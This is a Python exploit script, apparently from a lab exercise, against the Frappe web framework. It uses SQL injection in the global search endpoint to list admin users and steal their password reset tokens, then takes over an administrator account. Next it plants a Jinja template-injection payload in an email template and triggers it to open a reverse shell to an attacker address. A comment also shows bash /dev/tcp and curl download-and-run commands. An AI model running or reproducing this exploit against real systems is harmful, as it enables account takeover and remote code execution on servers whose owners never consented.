import requests
import json
import random, string
import sys
'''
global websearch returns responses in json
Ex
{
    'message': [
        {   
            'route': 'Administrator', 
            'relevance': 0,
            'name': '2',
            'content': '3',
            'title': '4',
            'doctype': '1'
        }, 
        {
            'route': 'zeljka.k@randomdomain.com',
            'relevance': 0,
            'name': '2',
            'content': '3',
            'title': '4',
            'doctype': '1'
        }
    ]
}

'''

def get_admin_users(session, url, proxies=None):
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select 1,2,3,4, name COLLATE utf8mb4_general_ci FROM __Auth#"}
    res = None
    admin_users = []
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        for user in res.json()['message']:
            admin_users.append(user['route'])
        return admin_users
    else:
        print(F"Error in get_admin_users: {res.status_code}, {res.content}")
        exit(1)

def request_password_reset(session, url, user, proxies=None):
    data = {"cmd": "frappe.core.doctype.user.user.reset_password", "user": F"{user}"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        parsed = json.loads(json.loads(res.json()['_server_messages'])[0])
        return parsed['message'] == 'Password reset instructions have been sent to your email'
    else:
        print(F"Error in request_password_reset: {res.status_code}, {res.content}")
        exit(1)
def extract_password_reset_token(session, url, user, proxies=None):
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        reset_token = None
        for users in res.json()['message']:
            if user == users['doctype']:
                reset_token = users['route']
                break
        return reset_token
    else:
        print(F"Error in extract_password_reset_token: {res.status_code}, {res.content}")
        exit(1)
def reset_password(session, url, reset_token, username, password='@Donkey1234',proxies=None):
    url += '/update-password?key=qDObkZaaLmu9vkwqLaO4F07FbFDyKOxK'
    data = {"key": F"{reset_token}", "old_password": '', "new_password": F"{password}", "logout_all_sessions": "1", "cmd": "frappe.core.doctype.user.user.update_password"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        parsed = res.json()
        if 'home_page' in parsed:
            print(F'Username: {username}')
            print(F'Password: {password}')
        
    else:
        print(F"Error in reset_password: {res.status_code}, {res.content}")
        exit(1)

def create_email_template(session, url, user, template_name, ssti,proxies=None):
    url += 'api/method/frappe.desk.form.save.savedocs'
    data = {"doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 2\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"%s\",\"__newname\":\"%s\",\"subject\":\"%s\",\"response\":\"<div>%s</div>\"}" %(user,template_name, template_name, ssti), "action": "Save"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        return True
    else:
        print(F"Error in create_email_template: {res.status_code}, {res.content}")
        exit(1)

# fully working rce => reverse shell
# contents of shell: /bin/bash -i >& /dev/tcp/192.168.119.139/4444 0>&1
# this also includes a one liner via python
'''
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{% for x in subclasses_r %}
{% if 'Popen' in x|attr('__qualname__')%}
{{ x(["/usr/bin/touch" ,"/tmp/bananas"]) }}
{{ x(["/usr/bin/curl" ,"http://192.168.119.139/jinja-ssti-test-env/shell", "-o", "/tmp/simpdaddy"]) }}
{{ x(["/bin/chmod" ,"+x", "/tmp/simpdaddy"]) }}
{{ x(["/bin/bash","-c","/tmp/simpdaddy"]) }}
{{ x(["/usr/bin/python3","-c","import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.119.139',4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"]) }}
{% endif %}
{% endfor %}
'''
def trigger_ssti_email_template(session, url, template_name, user, ssti, proxies=None):
    url += 'api/method/frappe.email.doctype.email_template.email_template.get_email_template'
    data = {"template_name": F"{template_name}", "doc": "{\"name\":\"%s\",\"docstatus\":0,\"subject\":\"%s\",\"parentfield\":null,\"modified_by\":\"%s\",\"doctype\":\"Email Template\",\"response\":\"<div>%s</div>\",\"creation\":\"2022-11-09 10:46:27.926196\",\"modified\":\"2022-11-09 10:46:27.926196\",\"parenttype\":null,\"owner\":\"%s\",\"parent\":null,\"idx\":0,\"__last_sync_on\":\"2022-11-09T15:46:28.016Z\"}" % (template_name,template_name,user,ssti,user), "_lang": ''}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        return res.json()
    else:
        print(F"Error in trigger_ssti_email_template: {res.status_code}, {res.content}")
        exit(1)

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print(F"Usage: python3 {sys.argv[0]} <target ip> <your ip> <your port> ")
    
    url = F"http://{sys.argv[1]}:8000/"
    session = requests.session()
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    admin_users = get_admin_users(session, url)
    user = admin_users[1]
    print('Admin users: ', admin_users)
    request_password_reset(session, url, user)
    reset_token = extract_password_reset_token(session, url, user)
    reset_password(session, url, reset_token, user)

    # at this poing we are effectively logged in to the application

    template_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
    # a template to enumerate all of the subclasses of object
    # we are interested in the index of open
    enumerate_classes_ssti = '{% set string = \\\"ssti\\\" %} {% set class = \\\"__class__\\\" %} {% set mro = \\\"__mro__\\\" %} {% set subclasses = \\\"__subclasses__\\\" %} {% set mro_r = string|attr(class)|attr(mro) %} {% set subclasses_r = mro_r[1]|attr(subclasses)() %} {{ subclasses_r }}'

    # Notice here we had to escape all the '%' for us to be able to supply the ip and port of the reverse shell
    rce_ssti = '{%% set string = \\\"ssti\\\" %%} {%% set class = \\\"__class__\\\" %%} {%% set mro = \\\"__mro__\\\" %%} {%% set subclasses = \\\"__subclasses__\\\" %%} {%% set mro_r = string|attr(class)|attr(mro) %%} {%% set subclasses_r = mro_r[1]|attr(subclasses)() %%} {%% for x in subclasses_r %%} {%% if \'Popen\' in x|attr(\'__qualname__\')%%} {{ x([\\\"/usr/bin/python3\\\",\\\"-c\\\",\\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'%s\', %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\'/bin/bash\')\\\"]) }} {%% endif %%}{%% endfor %%}' % (sys.argv[2], sys.argv[3])
    print(F"Poisoned email template: {template_name}")
    create_email_template(session, url, user, template_name, rce_ssti)
    res = trigger_ssti_email_template(session, url, template_name, user, rce_ssti)